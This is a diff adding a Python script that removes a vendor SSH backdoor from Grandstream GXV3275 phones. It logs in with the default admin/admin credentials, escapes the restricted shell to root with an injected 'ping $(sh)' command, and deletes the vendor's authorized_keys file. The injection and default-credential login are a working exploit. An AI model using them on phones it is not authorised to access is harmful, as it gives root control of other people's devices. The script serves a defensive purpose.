@@ -1,0 +1,133 @@
+#!/usr/bin/env python
+import paramiko, time, getopt, sys
+
+print "       __                                     __"
+print "      /\ \                                   /\ \\"
+print " _____\ \ \___   __  __  __    ___      __   \_\ \\"
+print "/\ '__`\ \  _ `\/\ \/\ \/\ \ /' _ `\  /'__`\ /'_` \\"
+print "\ \ \L\ \ \ \ \ \ \ \_/ \_/ \/\ \/\ \/\  __//\ \L\ \\"
+print " \ \ ,__/\ \_\ \_\ \___x___/'\ \_\ \_\ \____\ \___,_\\"
+print "  \ \ \/  \/_/\/_/\/__//__/   \/_/\/_/\/____/\/__,_ /"
+print "   \ \_\\"
+print "    \/_/"
+print "============================================================="
+print "Grandstream GXV3275 Backdoor Remover - http://phwned.com "
+print "Created by: Brendan Scarvell <bscarvell@gmail.com>"
+print "=============================================================\n"
+
+# PeRDy C0l0rZ
+OKGREEN = '\033[92m'
+WARNING = '\033[93m'
+FAIL = '\033[91m'
+ENDC = '\033[0m'
+
+# script arguments
+def showOptions():
+    print 'Options: '
+    print '\t--host=<host> Phone IP Address/Hostname'
+    print '\t--port=<port> (optional) Port of the running SSH service. Default: 22'
+    print '\t--pass=<password> (optional) SSH password for phone. Default: admin'
+    print '\t--user=<username> (optional) SSH username for phone. Default: admin'
+    print ''
+    sys.exit(2)
+
+def main (argv):
+    # Default Connection variables
+    host = ""
+    port = 22
+    username = 'admin'
+    password = 'admin'
+
+    try:
+        long_opts, args = getopt.getopt(argv,"",["host=","port=", "user=", "pass="])
+    except getopt.GetoptError:
+        showOptions()
+
+    # Set or override any connection info
+    for opt, arg in long_opts:
+        if opt == '--host':
+            host = arg
+        if opt == '--port':
+            port = arg
+        elif opt == '--user':
+            user = arg
+        elif opt == '--pass':
+            password = arg
+
+    # Make sure we have a host
+    if host == "":
+        showOptions()
+
+    # Try connecting to SSH Service (TODO: Add some connection error handling)
+    sshClient = paramiko.SSHClient()
+    sshClient.load_system_host_keys()
+    sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    # Connect to the phone
+    sshClient.connect(
+        host,
+        username=username,
+        password=password,
+        look_for_keys=False,
+        allow_agent=False
+    )
+
+    phone = sshClient.invoke_shell()
+
+    # Finish function
+    def fin(success = True):
+        if (success):
+            print "[+] Finished"
+        else:
+            print FAIL + "[!] Backdoor removal failed." + ENDC
+            print "[+] Finished"
+        phone.close()
+        exit()
+
+    # Start the "phwnage"
+    print "[+] Starting phwnage"
+    print "[+] Attempting shell breakout.."
+    phone.send('ping $(sh)\n')
+    phone.send('sh 1>&2\n')
+    # Wait for a response
+    time.sleep(1)
+
+    # Check if shell break out was successful
+    if ("/system/root" in phone.recv(1024)):
+        print "[+] w00t root"
+        print "[+] Checking for backdoor.."
+        # Check if authorized_keys exists
+        phone.send("cd /system/root/.ssh && ls\n")
+        time.sleep(1)
+        if ("authorized_keys" in phone.recv(1024)):
+            # Holey moley cheesy guacamole, we have a backdoor!!
+            print WARNING + "[!] Backdoor detected!" + ENDC
+            print "[+] Removing backdoor"
+
+            # Delete vendors key and wait for response
+            phone.send("rm /system/root/.ssh/authorized_keys\n")
+            time.sleep(1)
+            phone.recv(1024)
+
+            # Check that we've removed the backdoor
+            phone.send("ls\n")
+            time.sleep(1)
+            output = phone.recv(1024)
+
+            # Ah crap, didn't work :(
+            if ("authorized_keys" in output):
+                fin(False)
+            else:
+                # Sayonara!
+                print OKGREEN + "[+] Backdoor removed successfully" + ENDC
+                fin()
+        else:
+            # No authorized_keys backdoor. Hooray!
+            print OKGREEN + "[+] Backdoor not detected" + ENDC
+            fin()
+    else:
+        # Shell breakout failed :(
+        fin(False)
+
+if __name__ == "__main__":
+    main(sys.argv[1:])
